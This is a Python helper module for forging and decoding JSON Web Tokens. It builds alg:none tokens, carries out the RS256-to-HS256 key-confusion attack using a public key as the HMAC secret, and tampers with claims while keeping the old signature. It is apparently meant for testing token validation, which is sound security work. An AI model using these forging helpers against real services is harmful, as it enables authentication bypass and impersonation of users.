"""Pure token-forging and decoding helpers. No network, no server knowledge."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _encode_json(obj: dict[str, Any]) -> str:
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def none_token(claims: dict[str, Any]) -> str:
    """Build an unsigned `alg:none` token: `header.payload.` (empty signature)."""
    header = {"alg": "none", "typ": "JWT"}
    return f"{_encode_json(header)}.{_encode_json(claims)}."


def hs256_token(claims: dict[str, Any], secret: str | bytes) -> str:
    """Build a token signed HS256 with the given secret (string or raw bytes)."""
    key = secret.encode("utf-8") if isinstance(secret, str) else secret
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = f"{_encode_json(header)}.{_encode_json(claims)}"
    signature = hmac.new(key, signing_input.encode("ascii"), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(signature)}"


def pubkey_as_hmac_token(claims: dict[str, Any], public_key_pem: str) -> str:
    """RS256->HS256 confusion: sign HS256 using the RSA public key PEM as the secret."""
    return hs256_token(claims, public_key_pem)


def tamper_claims(token: str, patch: dict[str, Any]) -> str:
    """Patch a token's claims while keeping its original (now-invalid) signature."""
    parts = (token.split(".") + ["", "", ""])[:3]
    header_b64, payload_b64, signature_b64 = parts
    payload = json.loads(_b64url_decode(payload_b64))
    payload.update(patch)
    return f"{header_b64}.{_encode_json(payload)}.{signature_b64}"


def decode_claims(token: str) -> dict[str, Any]:
    """Decode a token's payload without verifying anything."""
    return json.loads(_b64url_decode(token.split(".")[1]))


def decode_header(token: str) -> dict[str, Any]:
    """Decode a token's header without verifying anything."""
    return json.loads(_b64url_decode(token.split(".")[0]))
